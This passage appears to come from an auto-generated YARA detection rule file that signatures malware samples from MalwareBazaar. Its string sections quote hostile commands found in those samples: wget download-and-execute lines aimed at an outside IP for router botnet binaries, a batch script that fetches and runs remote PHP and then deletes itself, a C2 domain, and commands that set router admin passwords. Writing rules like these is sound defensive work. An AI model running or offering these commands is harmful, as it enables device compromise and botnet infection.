      $s16 = "Failed to initialize security descriptor for temporary directory!" fullword ascii
      $s17 = "%s%c%s.exe" fullword ascii
      $s18 = "Path of ucrtbase.dll (%s) and its name exceed buffer size (%d)" fullword ascii
      $s19 = "LOADER: failed to set the TMP environment variable." fullword wide
      $s20 = "Failed to create child process!" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule sig_1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed {
   meta:
      description = "evidences - file 1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed"
   strings:
      $s1 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s2 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s3 = "mybin/* /usr/bin/;rm -rf /tmp/mybin;mount -t tmpfs -o size=1 tmpfs /sbin;mv /usr/bin/wget /usr/bin/init;cp /usr/bin/init /usr/bi" ascii
      $s4 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s6 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s7 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s8 = "%s -t mangle -%c POSTROUTING -p tcp --sport %d -j QUEUE" fullword ascii
      $s9 = "http_downloader" fullword ascii
      $s10 = "cnc.pinklander.com" fullword ascii
      $s11 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.UserPassword \"%s\"" fullword ascii
      $s12 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.AdminPassword \"%s\"" fullword ascii
      $s13 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" fullword ascii
      $s14 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" fullword ascii
      $s15 = "%s -t mangle -n -L POSTROUTING > /tmp/pink/filter_ipt_check" fullword ascii
      $s16 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s17 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" fullword ascii
      $s18 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s19 = "p -rf /tmp/mybin/* /bin/;rm -rf /tmp/mybin/*;cp -rf /usr/bin/* /tmp/mybin/;mount -t tmpfs -o size=1m tmpfs /usr/bin;cp -rf /tmp/" ascii
      $s20 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule sig_41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5 {
   meta:
      description = "evidences - file 41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5"
   strings:
      $s1 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s2 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s3 = "mybin/* /usr/bin/;rm -rf /tmp/mybin;mount -t tmpfs -o size=1 tmpfs /sbin;mv /usr/bin/wget /usr/bin/init;cp /usr/bin/init /usr/bi" ascii
      $s4 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s6 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s7 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s8 = "%s -t mangle -%c POSTROUTING -p tcp --sport %d -j QUEUE" fullword ascii
      $s9 = "cnc.pinklander.com" fullword ascii
      $s10 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.UserPassword \"%s\"" fullword ascii
      $s11 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.AdminPassword \"%s\"" fullword ascii
      $s12 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" fullword ascii
      $s13 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" fullword ascii
      $s14 = "%s -t mangle -n -L POSTROUTING > /tmp/pink/filter_ipt_check" fullword ascii
      $s15 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s16 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" fullword ascii
      $s17 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s18 = "p -rf /tmp/mybin/* /bin/;rm -rf /tmp/mybin/*;cp -rf /usr/bin/* /tmp/mybin/;mount -t tmpfs -o size=1m tmpfs /usr/bin;cp -rf /tmp/" ascii
      $s19 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
      $s20 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8 {
   meta:
      description = "evidences - file a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8"
   strings:
      $s1 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s2 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s3 = "mybin/* /usr/bin/;rm -rf /tmp/mybin;mount -t tmpfs -o size=1 tmpfs /sbin;mv /usr/bin/wget /usr/bin/init;cp /usr/bin/init /usr/bi" ascii
      $s4 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s6 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s7 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s8 = "%s -t mangle -%c POSTROUTING -p tcp --sport %d -j QUEUE" fullword ascii
      $s9 = "cnc.pinklander.com" fullword ascii
      $s10 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.UserPassword \"%s\"" fullword ascii
      $s11 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.AdminPassword \"%s\"" fullword ascii
      $s12 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" fullword ascii
      $s13 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" fullword ascii
      $s14 = "%s -t mangle -n -L POSTROUTING > /tmp/pink/filter_ipt_check" fullword ascii
      $s15 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s16 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" fullword ascii
      $s17 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s18 = "p -rf /tmp/mybin/* /bin/;rm -rf /tmp/mybin/*;cp -rf /usr/bin/* /tmp/mybin/;mount -t tmpfs -o size=1m tmpfs /usr/bin;cp -rf /tmp/" ascii
      $s19 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
      $s20 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262 {
   meta:
      description = "evidences - file b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262"
   strings:
      $s1 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s2 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s3 = "mybin/* /usr/bin/;rm -rf /tmp/mybin;mount -t tmpfs -o size=1 tmpfs /sbin;mv /usr/bin/wget /usr/bin/init;cp /usr/bin/init /usr/bi" ascii
      $s4 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s6 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s7 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s8 = "%s -t mangle -%c POSTROUTING -p tcp --sport %d -j QUEUE" fullword ascii
      $s9 = "http_downloader" fullword ascii
      $s10 = "cnc.pinklander.com" fullword ascii
      $s11 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.UserPassword \"%s\"" fullword ascii
      $s12 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.AdminPassword \"%s\"" fullword ascii
      $s13 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" fullword ascii
      $s14 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" fullword ascii
      $s15 = "%s -t mangle -n -L POSTROUTING > /tmp/pink/filter_ipt_check" fullword ascii
      $s16 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s17 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" fullword ascii
      $s18 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s19 = "p -rf /tmp/mybin/* /bin/;rm -rf /tmp/mybin/*;cp -rf /usr/bin/* /tmp/mybin/;mount -t tmpfs -o size=1m tmpfs /usr/bin;cp -rf /tmp/" ascii
      $s20 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule sig_0b7ddc54925e47564b46e5be5a6fb9c8a7f30dcc048a85145d4ae3963ad3404d {
   meta:
      description = "evidences - file 0b7ddc54925e47564b46e5be5a6fb9c8a7f30dcc048a85145d4ae3963ad3404d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "0b7ddc54925e47564b46e5be5a6fb9c8a7f30dcc048a85145d4ae3963ad3404d"
   strings:
      $s1 = "[^[^_]" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "@;D$(|" fullword ascii /* Goodware String - occured 1 times */
      $s3 = "PPWSVjXh" fullword ascii
      $s4 = "Y[[^_]" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "\\$ [^[^_]" fullword ascii
      $s6 = "D$$PhE" fullword ascii
      $s7 = "t$PPWQ" fullword ascii
      $s8 = "c9Y@t&" fullword ascii
      $s9 = "t?PShM" fullword ascii
      $s10 = "t*PPVS" fullword ascii
      $s11 = "xT;,$wOtG" fullword ascii
      $s12 = "D$PPUj" fullword ascii
      $s13 = ";T$$}:" fullword ascii
      $s14 = "FTX[^_" fullword ascii
      $s15 = "tTPShM" fullword ascii
      $s16 = "t*PShM" fullword ascii
      $s17 = "l$<h<4" fullword ascii
      $s18 = "VHY[^_" fullword ascii
      $s19 = "tiPShM" fullword ascii
      $s20 = " Ht#Qh" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_0f804feeff0b4d1c976715bafb521d727b4f9ba8309ccf48cfe6f95eba346dda {
   meta:
      description = "evidences - file 0f804feeff0b4d1c976715bafb521d727b4f9ba8309ccf48cfe6f95eba346dda.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "0f804feeff0b4d1c976715bafb521d727b4f9ba8309ccf48cfe6f95eba346dda"
   strings:
      $s1 = "LpXWPd!." fullword ascii
      $s2 = ":KGry.Mgx" fullword ascii
      $s3 = "%X9|R:\\" fullword ascii
      $s4 = "o:\"R)A:" fullword ascii
      $s5 = "hoB.tTc" fullword ascii
      $s6 = "FT:\"a\"" fullword ascii
      $s7 = "C:\"bW " fullword ascii
      $s8 = "04y:\\*" fullword ascii
      $s9 = "ASAQAPH" fullword ascii
      $s10 = ";%i-e+Ov" fullword ascii
      $s11 = "k\\%s6,9" fullword ascii
      $s12 = "IRC1q=" fullword ascii
      $s13 = "k+ =NX" fullword ascii
      $s14 = "%- 2y!O" fullword ascii
      $s15 = "WareY44" fullword ascii
      $s16 = "zb;d%CJ%" fullword ascii
      $s17 = "\\c{PGJL$_U" fullword ascii
      $s18 = "!W%O%E_" fullword ascii
      $s19 = "6'K%K%(" fullword ascii
      $s20 = "^f%y%H" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 18000KB and
      8 of them
}

rule aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9b22a5b {
   meta:
      description = "evidences - file aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9b22a5b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9b22a5b"
   strings:
      $s1 = "The %s selected for this session is %s, which, with this server, is vulnerable to the 'Terrapin' attack CVE-2023-48795, potentia" ascii
      $s2 = "SSH to proxy and execute a command" fullword ascii
      $s3 = "MIT Kerberos GSSAPI64.DLL" fullword ascii
      $s4 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii
      $s5 = "\\\\.\\pipe\\putty-connshare" fullword ascii
      $s6 = "\\\\.\\pipe\\pageant.%s.%s" fullword ascii
      $s7 = "/using-cmdline-loghost.html" fullword ascii
      $s8 = "The %s selected for this session is %s, which, with this server, is vulnerable to the 'Terrapin' attack CVE-2023-48795, potentia" ascii
      $s9 = "\\gssapi64.dll" fullword ascii
      $s10 = "/pageant-cmdline-command.html" fullword ascii
      $s11 = "CreateMutex(\"%s\") failed: %s" fullword ascii
      $s12 = "The first host key type we have stored for this server is %s, which is below the configured warning threshold." fullword ascii
      $s13 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s14 = "/using-cmdline-hostkey.html" fullword ascii
      $s15 = "rlogin connection" fullword ascii
      $s16 = "Agent-forwarding connection closed" fullword ascii
      $s17 = "Using GSSAPI from GSSAPI64.DLL" fullword ascii
      $s18 = "/using-cmdline-agentauth.html" fullword ascii
      $s19 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii
      $s20 = "config-proxy-command" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule sig_6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd {
   meta:
      description = "evidences - file 6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd"
   strings:
      $x1 = "https://raw.githubusercontent.com/WutADude/LazyDiscordAndYouTubeUnlocker/refs/heads/master/Strategies/UserServices%20Zapret%20st" wide
      $x2 = "C:\\Users\\cotny\\source\\repos\\LazyDisYTUnloker\\LazyDisYTUnloker\\obj\\Release\\net8.0-windows\\win-x86\\LazyDisYTUnlocker.pd" ascii
      $x3 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Size, Sy" ascii
      $x4 = "fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, Sys" ascii
      $x5 = "ing.ContentAlignment, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Font, Sys" ascii
      $x6 = "ndows.Forms, Culture=neutral, PublicKeyToken=b77a5c561934e089rSystem.Drawing.ContentAlignment, System.Drawing, Version=4.0.0.0, " ascii
      $x7 = "fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3anSystem.Windows.Forms.For" ascii
      $x8 = "89fSystem.Drawing.Font, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3arSystem.Drawing.Content" ascii
      $x9 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Size, Sy" ascii
      $x10 = "fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3anSystem.Windows.Forms.For" ascii
      $x11 = "fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, Sys" ascii
      $s12 = "fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3anSystem.Windows.Forms.For" ascii
      $s13 = "https://raw.githubusercontent.com/WutADude/LazyDiscordAndYouTubeUnlocker/refs/heads/master/Hosts/DiscordHosts.txt" fullword wide
      $s14 = "https://raw.githubusercontent.com/WutADude/LazyDiscordAndYouTubeUnlocker/refs/heads/master/Hosts/YouTubeHosts.txt" fullword wide
      $s15 = "https://raw.githubusercontent.com/WutADude/LazyDiscordAndYouTubeUnlocker/refs/heads/master/Strategies/Dscord%20Zapret%20strategy" wide
      $s16 = "https://raw.githubusercontent.com/WutADude/LazyDiscordAndYouTubeUnlocker/refs/heads/master/Strategies/YouTube%20Zapret%20strateg" wide
      $s17 = "tral, PublicKeyToken=b03f5f7f11d50a3arSystem.Drawing.ContentAlignment, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicK" ascii
      $s18 = "utral, PublicKeyToken=b03f5f7f11d50a3arSystem.Drawing.ContentAlignment, System.Drawing, Version=4.0.0.0, Culture=neutral, Public" ascii
      $s19 = "hostfxr.dll" fullword wide
      $s20 = "tem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4.0" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule sig_300f2fae37a3a41694e036a64eb64b7853d2de6424baa0202fba2b4435e23c00 {
   meta:
      description = "evidences - file 300f2fae37a3a41694e036a64eb64b7853d2de6424baa0202fba2b4435e23c00.bat"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "300f2fae37a3a41694e036a64eb64b7853d2de6424baa0202fba2b4435e23c00"
   strings:
      $x1 = "taskkill /F /IM cmd.exe" fullword ascii
      $x2 = "cd /d \"%Userprofile%\\Downloads\\Support\\Python312\"" fullword ascii
      $s3 = "echo Script execution completed." fullword ascii
      $s4 = ":: Run the appropriate set of Python commands " fullword ascii
      $s5 = ":: Check if the script was run with a flag; if not, restart it minimized" fullword ascii
      $s6 = "    python.exe EAdate.py" fullword ascii
      $s7 = "    python.exe GXrop.py" fullword ascii
      $s8 = "    python.exe FAScis.py" fullword ascii
      $s9 = "    python.exe HPUope.py" fullword ascii
      $s10 = ":: Change to the specified directory" fullword ascii
      $s11 = "    start \"\" /min \"%~dpnx0\" MY_FLAG" fullword ascii
      $s12 = "  echo Other antivirus detected or no AV detected. Running f1 to f3 files..." fullword ascii
      $s13 = "if \"%1\"==\"\" (" fullword ascii
      $s14 = "endlocal" fullword ascii /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0xfeff and filesize < 28000KB and
      1 of ($x*) and 4 of them
}

rule sig_98415c21b45b1008b74b44cae8f3c27e803d2bb4a3899c79fb079c3cc833ac36 {
   meta:
      description = "evidences - file 98415c21b45b1008b74b44cae8f3c27e803d2bb4a3899c79fb079c3cc833ac36.bat"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "98415c21b45b1008b74b44cae8f3c27e803d2bb4a3899c79fb079c3cc833ac36"
   strings:
      $s1 = "powershell -Command \"Invoke-WebRequest -Uri '%url%' -OutFile '%php_file%'\"" fullword ascii
      $s2 = "set \"url=http://45.138.16.193/php-exe.php\"" fullword ascii
      $s3 = "set \"php_file=script.php\"" fullword ascii
      $s4 = "REM Auto-eliminazione dello script batch" fullword ascii
      $s5 = "REM Imposta il nome del file PHP e l'URL da cui scaricarlo" fullword ascii
      $s6 = "del %php_file%" fullword ascii
      $s7 = "php %php_file%" fullword ascii
      $s8 = "echo Auto-eliminazione dello script..." fullword ascii
      $s9 = "REM Elimina il file PHP dopo l'esecuzione" fullword ascii
      $s10 = "REM Esegui il file PHP" fullword ascii
      $s11 = "echo Eliminazione di %php_file%..." fullword ascii
      $s12 = "echo Esecuzione di %php_file%..." fullword ascii
      $s13 = "del \"%~f0\"" fullword ascii
      $s14 = "REM Scarica il file PHP" fullword ascii
   condition:
      uint16(0) == 0x6540 and filesize < 1KB and
      8 of them
}

rule sig_36e9cb167200d545a3bdfbc3cf6d059e0445311d760d9d204239dbc5b0c7ced3 {
   meta:
      description = "evidences - file 36e9cb167200d545a3bdfbc3cf6d059e0445311d760d9d204239dbc5b0c7ced3.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "36e9cb167200d545a3bdfbc3cf6d059e0445311d760d9d204239dbc5b0c7ced3"
   strings:
      $s1 = "7GQN8MOI21.pdf.lnkPK" fullword ascii
      $s2 = "7GQN8MOI21.pdf.lnk" fullword ascii
      $s3 = "Z:\\Z]Pv" fullword ascii
      $s4 = "NX>U:\"" fullword ascii
      $s5 = "(Q,%d-*" fullword ascii
      $s6 = "gET!KA" fullword ascii
      $s7 = "- ]|#|" fullword ascii
      $s8 = "\"J*zC\"!." fullword ascii
      $s9 = "F{E* Z{`rK" fullword ascii
      $s10 = ")yV1 -" fullword ascii
      $s11 = "QWmXaK4" fullword ascii
      $s12 = "IZv+ +I" fullword ascii
      $s13 = "qfrcse" fullword ascii
      $s14 = "XAr- B" fullword ascii
      $s15 = "#&>S3* nW" fullword ascii
      $s16 = "\\~nynMn}nsn{no" fullword ascii
      $s17 = "ROtEjC6" fullword ascii
      $s18 = "ftGyea0" fullword ascii
      $s19 = "!#N-- " fullword ascii
      $s20 = "7H%eq%Hv`" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 5000KB and
      8 of them
}

rule sig_39cb5f2f73d0459f4bc536cd4f63d9f376fff441bf7bd1d5c91969e9a1ab4e87 {
   meta:
      description = "evidences - file 39cb5f2f73d0459f4bc536cd4f63d9f376fff441bf7bd1d5c91969e9a1ab4e87.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "39cb5f2f73d0459f4bc536cd4f63d9f376fff441bf7bd1d5c91969e9a1ab4e87"
   strings:
      $s1 = "cd /tmp; rm -rf 3; wget http://103.136.41.100/3; chmod 777 3; ./3 tplink.arm;" fullword ascii
      $s2 = "cd /tmp; rm -rf 4; wget http://103.136.41.100/4; chmod 777 4; ./4 tplink.arm5;" fullword ascii
      $s3 = "cd /tmp; rm -rf 2; wget http://103.136.41.100/2; chmod 777 2; ./2 tplink.mpsl;" fullword ascii
      $s4 = "cd /tmp; rm -rf 5; wget http://103.136.41.100/5; chmod 777 5; ./5 tplink.arm6;" fullword ascii
      $s5 = "cd /tmp; rm -rf 12; wget http://103.136.41.100/12; chmod 777 12; ./12 tplink.mips;" fullword ascii
      $s6 = "cd /tmp; rm -rf 6; wget http://103.136.41.100/6; chmod 777 6; ./6 tplink.arm7;" fullword ascii
      $s7 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s8 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s9 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s10 = "rm -rf t" fullword ascii
      $s11 = "echo \"\" > t" fullword ascii
      $s12 = "            kill -9 \"$pid\"" fullword ascii
